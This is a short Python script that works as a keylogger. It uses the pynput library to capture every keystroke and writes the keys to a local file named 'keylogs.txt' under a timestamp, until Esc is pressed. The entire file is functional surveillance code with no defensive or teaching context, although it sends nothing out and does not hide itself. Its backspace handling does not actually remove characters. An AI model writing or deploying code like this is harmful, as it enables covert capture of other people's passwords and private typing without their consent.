#!/bin/python3
from pynput import keyboard
import sys
import time
import os

file_name= "keylogs.txt"
file_writer = open(file_name,"w")
curr_time = time.ctime(time.time())
file_writer.write(curr_time)
file_writer.write("\n")
file_writer.write("-------------------------------------------\n")



def run_on_press(key):
     #print(str(key))
     stroke = str(key).replace("'","")
     if str(key)=='Key.enter':
         file_writer.write("\n")
     elif str(key)=='Key.space':
         file_writer.write(" ")
     elif str(key)=='Key.backspace':
         file_writer.seek(file_writer.tell()-1,os.SEEK_SET)
         file_writer.write("")
     
     else:
         file_writer.write(stroke)
     
def run_on_release(key):
     if str(key)=='Key.esc':
         file_writer.close()
         #sys.exit(0)
         return False
         
with keyboard.Listener(on_press=run_on_press,on_release=run_on_release) as listener:
     listener.join()   # this line run the script
